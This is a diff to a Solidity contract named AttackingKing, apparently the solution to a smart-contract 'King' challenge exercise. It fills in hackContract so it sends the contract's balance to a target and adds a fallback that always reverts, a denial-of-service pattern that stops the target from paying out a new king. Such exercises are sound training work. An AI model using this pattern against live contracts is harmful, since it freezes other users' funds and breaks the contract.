@@ -11,6 +11,12 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        (bool success, bytes memory data) = contractAddress.call{
+            value: address(this).balance
+        }("");
+    }
+
+    fallback() external payable {
+        revert();
     }
 }
